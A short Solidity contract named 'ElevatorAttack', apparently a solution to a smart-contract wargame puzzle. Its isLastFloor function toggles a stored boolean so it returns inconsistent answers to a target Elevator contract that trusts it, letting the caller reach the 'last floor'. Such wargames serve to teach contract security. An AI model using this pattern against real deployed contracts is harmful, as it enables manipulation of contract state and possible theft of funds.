// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
  function goTo(uint256 _floor) external ;
}

contract ElevatorAttack {

    bool public rs;
    IElevator public elevator;

    constructor(address _elevator) {
      elevator = IElevator(_elevator);
    }

    function goTo(uint256 _floor) public {
      elevator.goTo(_floor);
    }

    function isLastFloor(uint256 _floor) external returns (bool r) {
      r = rs;
      rs = !rs;
    }

    
}